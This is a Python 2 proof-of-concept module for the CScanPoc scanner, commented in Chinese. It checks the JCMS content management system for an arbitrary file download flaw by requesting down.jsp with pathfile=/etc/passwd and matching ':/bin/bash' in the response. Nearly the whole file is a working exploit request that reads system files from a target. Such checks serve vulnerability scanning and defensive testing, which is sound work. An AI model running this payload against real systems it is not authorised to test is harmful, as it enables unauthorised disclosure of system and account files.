# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'JCMS_0003'  # 平台漏洞编号，留空
    name = 'JCMS 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-01-04'  # 漏洞公布时间
    desc = '''
        大汉版通jcms系统任意文件读取，可以直接获取系统文件。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'JCMS'  # 漏洞应用名称
    product_version = 'JCMS'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'dbfe99d7-8acd-4fdd-b669-83c9a88c20db'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = ('%s/jcms/m_5_e/module/voting/down.jsp?filename=a.txt&pathfile=/etc/passwd') % self.target

            req = requests.get(verify_url)
            if req.status_code == 200 and ":/bin/bash" in req.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
